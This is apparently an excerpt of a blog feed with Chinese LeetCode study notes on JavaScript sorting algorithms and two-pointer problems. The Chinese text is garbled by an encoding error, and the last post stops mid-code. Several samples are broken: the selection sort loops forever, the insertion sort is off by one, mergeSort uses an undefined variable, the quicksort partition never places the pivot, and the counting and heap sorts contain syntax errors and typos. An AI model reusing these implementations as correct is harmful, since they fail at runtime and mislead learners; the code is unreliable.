      <content type="html"><![CDATA[<blockquote><p><code>O(nÂ²)</code>: å†’æ³¡æ’åºã€é€‰æ‹©æ’åºã€æ’å…¥æ’åº<br>  <code>O(nlogn)</code>: å½’å¹¶æ’åºã€å¿«é€Ÿæ’åºã€å †æ’åº<br>  <code>O(n)</code>: è®¡æ•°æ’åºã€æ¡¶æ’åºã€åŸºæ•°æ’åº</p></blockquote><h3 id="1-å†’æ³¡æ’åº"><a href="#1-å†’æ³¡æ’åº" class="headerlink" title="1. å†’æ³¡æ’åº"></a>1. å†’æ³¡æ’åº</h3><p>å†’æ³¡æ’åºåªä¼šæ“ä½œç›¸é‚»çš„ä¸¤ä¸ªæ•°æ®ã€‚æ¯æ¬¡å†’æ³¡æ“ä½œéƒ½ä¼šå¯¹ç›¸é‚»çš„ä¸¤ä¸ªå…ƒç´ è¿›è¡Œæ¯”è¾ƒï¼Œçœ‹æ˜¯å¦æ»¡è¶³å¤§å°å…³ç³»è¦æ±‚ï¼Œå¦‚æœä¸æ»¡è¶³å°±è®©å®ƒä¿©äº’æ¢ã€‚ä¸€æ¬¡å†’æ³¡è‡³å°‘ä¼šè®©ä¸€ä¸ªå…ƒç´ ç§»åŠ¨åˆ°å®ƒåº”åœ¨çš„ä½ç½®ï¼Œé‡å¤ n æ¬¡ï¼Œå°±å®Œæˆäº† n ä¸ªæ•°æ®çš„æ’åºå·¥ä½œã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = [<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>]   <span class="comment">// ç¬¬ä¸€æ¬¡éå†åï¼Œè‡³å°‘6ä¼šåœ¨æ­£ç¡®çš„ä½ç½®ä¸Š</span></span><br><span class="line"><span class="keyword">const</span> bubbleSort = <span class="function"><span class="params">arr</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (arr.length &lt;= <span class="number">1</span>) <span class="keyword">return</span> arr</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.length - <span class="number">1</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">let</span> hasChange = <span class="literal">false</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; arr.length - i - <span class="number">1</span>; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>]) &#123;</span><br><span class="line">        <span class="keyword">const</span> temp = arr[j]</span><br><span class="line">        arr[j] = arr[j + <span class="number">1</span>]</span><br><span class="line">        arr[j + <span class="number">1</span>] = temp</span><br><span class="line">        hasChange = <span class="literal">true</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!hasChange) <span class="keyword">break</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> arr</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/08/19/Leetcode-æ’åº/1.gif"></p><p><br></p><h3 id="2-é€‰æ‹©æ’åº"><a href="#2-é€‰æ‹©æ’åº" class="headerlink" title="2. é€‰æ‹©æ’åº"></a>2. é€‰æ‹©æ’åº</h3><p>é€‰æ‹©æ’åºæŠŠæ•°ç»„ä¸­çš„æ•°æ®åˆ†æˆå‰åä¸¤ä¸ªåŒºé—´ï¼Œå·²æ’åºåŒºé—´å’Œæœªæ’åºåŒºé—´ã€‚åœ¨æœªæ’åºåŒºé—´é‡Œæ‰¾åˆ°æœ€å°å…ƒç´ ï¼Œå­˜æ”¾åˆ°å·²æ’åºåºåˆ—çš„æœ«å°¾ï¼Œä»¥æ­¤ç±»æ¨ï¼Œç›´åˆ°æ‰€æœ‰å…ƒç´ å‡æ’åºå®Œæ¯•ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> selectionSort = <span class="function"><span class="params">arr</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">    <span class="keyword">let</span> minIndex = i</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = i; i &lt; arr.length; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (arr[j] &lt; arr[minIndex]) &#123;</span><br><span class="line">        minIndex = j</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> temp = arr[i]</span><br><span class="line">    arr[i] = arr[minIndex]</span><br><span class="line">    arr[minIndex] = temp</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> arr</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/2021/08/19/Leetcode-æ’åº/3.gif"></p><p><br></p><h3 id="3-æ’å…¥æ’åº"><a href="#3-æ’å…¥æ’åº" class="headerlink" title="3. æ’å…¥æ’åº"></a>3. æ’å…¥æ’åº</h3><p>æ’å…¥æ’åºå°†æ•°ç»„ä¸­çš„æ•°æ®åˆ†ä¸ºå‰åä¸¤ä¸ªåŒºé—´ï¼Œå·²æ’åºåŒºé—´å’Œæœªæ’åºåŒºé—´ã€‚åˆå§‹å·²æ’åºåŒºé—´åªæœ‰ä¸€ä¸ªå…ƒç´ ï¼Œå°±æ˜¯æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚ç„¶åå–æœªæ’åºåŒºé—´ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œåœ¨å·²æ’åºåŒºé—´ä¸­æ‰¾åˆ°åˆé€‚çš„ä½ç½®æ’å…¥ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = [<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>]</span><br><span class="line"><span class="keyword">const</span> insertSort = <span class="function"><span class="params">arr</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">    preIndex = i - <span class="number">1</span></span><br><span class="line">    current = arr[i]</span><br><span class="line">    <span class="keyword">while</span> (arr[preIndex] &gt; current &amp;&amp; preIndex &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      arr[preIndex + <span class="number">1</span>] = arr[preIndex]</span><br><span class="line">      preIndex--</span><br><span class="line">    &#125;</span><br><span class="line">    arr[preIndex + <span class="number">1</span>] = current</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> arr</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/2021/08/19/Leetcode-æ’åº/2.gif"><br><br></p><h3 id="4-å½’å¹¶æ’åº"><a href="#4-å½’å¹¶æ’åº" class="headerlink" title="4. å½’å¹¶æ’åº"></a>4. å½’å¹¶æ’åº</h3><p>å°†å·²æœ‰åºçš„å­åºåˆ—åˆå¹¶ï¼Œå¾—åˆ°å®Œå…¨æœ‰åºçš„åºåˆ—ã€‚å†å°†ä¸¤ä¸ªæœ‰åºçš„æ•°ç»„åˆå¹¶æˆä¸€ä¸ªæœ‰åºçš„æ•°ç»„ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mergeSort</span> (<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> len = arr.length</span><br><span class="line">  <span class="keyword">if</span> (len &lt; <span class="number">2</span>) <span class="keyword">return</span> arr</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">const</span> mid = <span class="built_in">Math</span>.floor(len / <span class="number">2</span>),</span><br><span class="line">        left = arr.slice(<span class="number">0</span>, middle),</span><br><span class="line">        right = arr.slice(middle)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> merge(mergeSort(left), mergeSort(right))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span> (<span class="params">left, right</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> result = []</span><br><span class="line">  <span class="keyword">while</span> (left.length &gt; <span class="number">0</span> &amp;&amp; right.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (left[<span class="number">0</span>] &lt; right[<span class="number">0</span>]) &#123;</span><br><span class="line">      result.push(left.shift())</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      result.push(right.shift())</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (left.length) &#123;</span><br><span class="line">    result.push(left.shift())</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (right.length) &#123;</span><br><span class="line">    result.push(right.shift())</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/2021/08/19/Leetcode-æ’åº/4.gif"></p><p><br></p><h3 id="5-å¿«é€Ÿæ’åº"><a href="#5-å¿«é€Ÿæ’åº" class="headerlink" title="5. å¿«é€Ÿæ’åº"></a>5. å¿«é€Ÿæ’åº</h3><p>å¦‚æœè¦æ’åºæ•°ç»„ä¸­ä¸‹æ ‡ä» p åˆ° r ä¹‹é—´çš„ä¸€ç»„æ•°æ®ï¼Œæˆ‘ä»¬é€‰æ‹© p åˆ° r ä¹‹é—´çš„ä»»æ„ä¸€ä¸ªæ•°æ®ä½œä¸º privot (åˆ†åŒºç‚¹)ã€‚æˆ‘ä»¬éå† p åˆ° r ä¹‹é—´çš„æ•°æ®ï¼Œå°†å°äº pivot çš„æ”¾åˆ°å·¦è¾¹ï¼Œå°†å¤§äº pivot çš„æ”¾åˆ°å³è¾¹ï¼Œå°† pivot æ”¾åˆ°ä¸­é—´ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">quickSort</span> (<span class="params">arr, left, right</span>) </span>&#123;</span><br><span class="line">  left = <span class="keyword">typeof</span> left !== <span class="string">'number'</span> ? <span class="number">0</span> : left,</span><br><span class="line">  right = <span class="keyword">typeof</span> right !== <span class="string">'number'</span> ? arr.length - <span class="number">1</span> : right</span><br><span class="line"></span><br><span class="line">  <span class="keyword">debugger</span></span><br><span class="line">  <span class="keyword">if</span> (left &lt; right) &#123;</span><br><span class="line">    <span class="keyword">const</span> partitionIndex = partition(arr, left, right)</span><br><span class="line">    quickSort(arr, left, partitionIndex - <span class="number">1</span>)</span><br><span class="line">    quickSort(arr, partitionIndex + <span class="number">1</span>, right)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> arr</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">partition</span>(<span class="params">arr, left, right</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> pivot = left, <span class="comment">// åŸºå‡†ç‚¹</span></span><br><span class="line">      index = pivot + <span class="number">1</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = index; i &lt;= right; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (arr[i] &lt; arr[pivot]) &#123;</span><br><span class="line">      swap(arr, i, index)</span><br><span class="line">      index++</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> index - <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">swap</span>(<span class="params">arr, i, j</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> temp = arr[i]</span><br><span class="line">  arr[i] = arr[j]</span><br><span class="line">  arr[j] = temp</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/08/19/Leetcode-æ’åº/5.gif"></p><p><br></p><h3 id="6-å †æ’åº"><a href="#6-å †æ’åº" class="headerlink" title="6. å †æ’åº"></a>6. å †æ’åº</h3><p>å¤§é¡¶å †å’Œå°é¡¶å †ï¼Œå°±æ˜¯æˆ‘ä»¬æƒ³è¦çš„æ•°æ®ç»“æ„ã€‚å®ƒæ€»æ˜¯ä¿æŒç€å †é¡¶å…ƒç´ æ˜¯æœ€å¤§/æœ€å°çš„ã€‚è¿™é‡Œå‡è®¾æˆ‘ä»¬å·²ç»å®ç°äº†<em>å¤§é¡¶å †</em>å’Œ<em>å°é¡¶å †</em>ï¼Œå®ƒå…è®¸åˆå§‹åŒ–ä¸€ä¸ªæ•°ç»„ï¼Œå¯¹æ•°ç»„ä¸­çš„å…ƒç´ è¿›è¡Œå †æ’åºã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">varlen;   <span class="comment">// å› ä¸ºå£°æ˜çš„å¤šä¸ªå‡½æ•°éƒ½éœ€è¦æ•°æ®é•¿åº¦ï¼Œæ‰€ä»¥æŠŠlenè®¾ç½®æˆä¸ºå…¨å±€å˜é‡</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">buildMaxHeap</span>(<span class="params">arr</span>) </span>&#123;  <span class="comment">// å»ºç«‹å¤§é¡¶å †</span></span><br><span class="line">  len = arr.length;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="built_in">Math</span>.floor(len/<span class="number">2</span>); i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">    heapify(arr, i);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">heapify</span>(<span class="params">arr, i</span>) </span>&#123;    <span class="comment">// å †è°ƒæ•´</span></span><br><span class="line">  <span class="keyword">var</span> left = <span class="number">2</span> * i + <span class="number">1</span>,</span><br><span class="line">      right = <span class="number">2</span> * i + <span class="number">2</span>,</span><br><span class="line">      largest = i;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(left &lt; len &amp;&amp; arr[left] &gt; arr[largest]) &#123;</span><br><span class="line">    largest = left;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(right &lt; len &amp;&amp; arr[right] &gt; arr[largest]) &#123;</span><br><span class="line">    largest = right;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(largest != i) &#123;</span><br><span class="line">    swap(arr, i, largest);</span><br><span class="line">    heapify(arr, largest);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">swap</span>(<span class="params">arr, i, j</span>) </span>&#123;</span><br><span class="line">  vartemp = arr[i];</span><br><span class="line">  arr[i] = arr[j];</span><br><span class="line">  arr[j] = temp;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">heapSort</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  buildMaxHeap(arr);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(vari = arr.length - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">    swap(arr, <span class="number">0</span>, i);</span><br><span class="line">    len--;</span><br><span class="line">    heapify(arr, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  returnarr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="7-è®¡æ•°æ’åº"><a href="#7-è®¡æ•°æ’åº" class="headerlink" title="7. è®¡æ•°æ’åº"></a>7. è®¡æ•°æ’åº</h3><p>è®¡æ•°æ’åºè¦æ±‚è¾“å…¥çš„æ•°æ®å¿…é¡»æ˜¯æœ‰ç¡®å®šèŒƒå›´çš„æ•´æ•°ã€‚å…¶æ ¸å¿ƒæ˜¯å°†è¾“å…¥çš„æ•°æ®å€¼åŒ–ä¸ºé”®å­˜å‚¨åœ¨æ•°ç»„ä¸­ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">countingSort</span> (<span class="params">arr, maxValue</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> bucket = <span class="keyword">new</span> <span class="built_in">Array</span>(maxValue + <span class="number">1</span>)</span><br><span class="line">  <span class="keyword">let</span> sortedIndex = <span class="number">0</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (bucket[arr[i]]) &#123;</span><br><span class="line">      bucket[arr[i]] = <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">    bucket[arr[i]]++</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; bucket.length; i+) &#123;</span><br><span class="line">    <span class="keyword">while</span> (bucket[i] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      arr[sortedIndex] = j</span><br><span class="line">      sortedIndex++</span><br><span class="line">      bucket[j]--</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> arr</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="8-æ¡¶æ’åº"><a href="#8-æ¡¶æ’åº" class="headerlink" title="8. æ¡¶æ’åº"></a>8. æ¡¶æ’åº</h3><p>å‡è®¾è¾“å…¥æ•°æ®æœä»å‡åŒ€åˆ†å¸ƒï¼Œå°†æ•°æ®åˆ†åˆ°æœ‰é™æ•°é‡çš„æ¡¶é‡Œï¼Œæ¯ä¸ªæ¡¶å†åˆ†åˆ«æ’åºã€‚</p><h3 id="9-åŸºæ•°æ’åº"><a href="#9-åŸºæ•°æ’åº" class="headerlink" title="9. åŸºæ•°æ’åº"></a>9. åŸºæ•°æ’åº</h3><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://www.cnblogs.com/onepixel/p/7674659.html" target="_blank" rel="noopener">åå¤§ç»å…¸æ’åºç®—æ³•ï¼ˆåŠ¨å›¾æ¼”ç¤ºï¼‰</a></li></ul>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>ğŸ¤” åŒæŒ‡é’ˆ</title>
      <link href="/2021/08/19/Leetcode-%E5%8F%8C%E6%8C%87%E9%92%88/"/>
      <url>/2021/08/19/Leetcode-%E5%8F%8C%E6%8C%87%E9%92%88/</url>
      <content type="html"><![CDATA[<h3 id="1-åŒæŒ‡é’ˆ-TwoPoints"><a href="#1-åŒæŒ‡é’ˆ-TwoPoints" class="headerlink" title="1. åŒæŒ‡é’ˆ TwoPoints"></a>1. åŒæŒ‡é’ˆ TwoPoints</h3><p>åŒæŒ‡é’ˆï¼Œæ˜¯æŒ‡ç”¨ä¸¤ä¸ªå˜é‡åœ¨çº¿æ€§ç»“æ„ä¸Šéå†è€Œè§£å†³çš„é—®é¢˜ã€‚åŒæŒ‡é’ˆç®—æ³•æ˜¯åŸºäºæš´åŠ›è§£æ³•çš„ä¼˜åŒ–ã€‚</p><ul><li>å¯¹äºæ•°ç»„ï¼ŒæŒ‡ä¸¤ä¸ªå˜é‡åœ¨æ•°ç»„ä¸Šç›¸å‘ç§»åŠ¨è§£å†³çš„é—®é¢˜</li><li>å¯¹äºé“¾è¡¨ï¼ŒæŒ‡ä¸¤ä¸ªå˜é‡åœ¨é“¾è¡¨ä¸ŠåŒå‘ç§»åŠ¨è§£å†³çš„é—®é¢˜ï¼Œä¹Ÿç§°ä¸ºã€Œå¿«æ…¢æŒ‡é’ˆã€é—®é¢˜</li></ul><p><br></p><h3 id="2-é¢˜ç›®ç±»å‹"><a href="#2-é¢˜ç›®ç±»å‹" class="headerlink" title="2. é¢˜ç›®ç±»å‹"></a>2. é¢˜ç›®ç±»å‹</h3><table><thead><tr><th>ç±»å‹</th><th style="text-align:right">LeetCodeé¢˜ç›®</th></tr></thead><tbody><tr><td>å·¦å³æŒ‡é’ˆå¤¹é€¼</td><td style="text-align:right">1.ä¸¤æ•°ä¹‹å’Œã€125.éªŒè¯å›æ–‡ä¸²ã€11.ç››æœ€å¤šæ°´çš„å®¹å™¨ã€15.ä¸‰æ•°ä¹‹å’Œã€ 18.å››æ•°ä¹‹å’Œ</td></tr><tr><td>å¿«æ…¢æŒ‡é’ˆ</td><td style="text-align:right">141.ç¯å½¢é“¾è¡¨ã€202.å¿«ä¹æ•°</td></tr></tbody></table><p><br></p><h3 id="3-å·¦å³æŒ‡é’ˆå¤¹é€¼"><a href="#3-å·¦å³æŒ‡é’ˆå¤¹é€¼" class="headerlink" title="3. å·¦å³æŒ‡é’ˆå¤¹é€¼"></a>3. å·¦å³æŒ‡é’ˆå¤¹é€¼</h3><p>å·¦å³æŒ‡é’ˆåˆ†åˆ«æŒ‡å‘å·¦å³ä¸¤ç«¯ï¼Œæ ¹æ®æƒ…å†µå‘ä¸­é—´ç§»åŠ¨ã€‚é€‚ç”¨äº<strong>ä¸¤æ•°ä¹‹å’Œ</strong>ï¼Œ<strong>ä¸‰æ•°ä¹‹å’Œ</strong>ï¼Œ<strong>å››æ•°ä¹‹å’Œ</strong>, <strong>ç››æœ€å¤šæ°´çš„å®¹å™¨</strong>è¿™æ ·çš„LeetCodeé¢˜ç›®ï¼Œå…ˆå¯¹æ•°ç»„è¿›è¡Œæ’åºï¼Œç„¶åå·¦å³å¤¹é€¼æ±‚å€¼ã€‚</p><p><br></p><h4 id="1-ä¸¤æ•°ä¹‹å’Œ"><a href="#1-ä¸¤æ•°ä¹‹å’Œ" class="headerlink" title="1. ä¸¤æ•°ä¹‹å’Œ"></a>1. ä¸¤æ•°ä¹‹å’Œ</h4><p>ç»™å®šä¸€ä¸ªæœ‰åºæ•´æ•°æ•°ç»„ nums å’Œä¸€ä¸ªæ•´æ•°ç›®æ ‡å€¼ targetï¼Œè¯·ä½ åœ¨è¯¥æ•°ç»„ä¸­æ‰¾å‡º å’Œä¸ºç›®æ ‡å€¼ target çš„é‚£ä¸¤ä¸ªæ•´æ•°ï¼Œå¹¶è¿”å›å®ƒä»¬çš„æ•°ç»„ä¸‹æ ‡ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> twoSum = <span class="function"><span class="keyword">function</span>(<span class="params">nums, target</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length; i++ ) &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> j = i + <span class="number">1</span>; j &lt; nums.length; j++ ) &#123;</span><br><span class="line">      <span class="keyword">if</span> (nums[i] + nums[j] === target) &#123;</span><br><span class="line">        <span class="keyword">return</span> [i, j]</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="15-ä¸‰æ•°ä¹‹å’Œ"><a href="#15-ä¸‰æ•°ä¹‹å’Œ" class="headerlink" title="15. ä¸‰æ•°ä¹‹å’Œ"></a>15. ä¸‰æ•°ä¹‹å’Œ</h4><p>ç»™ä½ ä¸€ä¸ªåŒ…å« n ä¸ªæ•´æ•°çš„æ•°ç»„ numsï¼Œåˆ¤æ–­ nums ä¸­æ˜¯å¦å­˜åœ¨ä¸‰ä¸ªå…ƒç´  aï¼Œbï¼Œc ï¼Œä½¿å¾— a + b + c = 0 ï¼Ÿè¯·ä½ æ‰¾å‡ºæ‰€æœ‰å’Œä¸º 0 ä¸”ä¸é‡å¤çš„ä¸‰å…ƒç»„ã€‚</p><ul><li>æš´åŠ›ï¼šä¸‰é‡å¾ªç¯ï¼Œä½¿ç”¨Setè¿›è¡Œåˆ¤é‡ï¼ˆä¼šè¶…å‡ºæ—¶é—´é™åˆ¶ï¼‰<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> threeSum = <span class="function"><span class="params">nums</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (nums === <span class="literal">null</span> || nums.length &lt; <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line">  &#125;</span><br><span class="line">  nums = nums.sort()</span><br><span class="line">  <span class="keyword">const</span> result = []</span><br><span class="line">  <span class="keyword">const</span> resultSet = <span class="keyword">new</span> <span class="built_in">Set</span>() <span class="comment">// ç”¨ä½œåˆ¤é‡</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length - <span 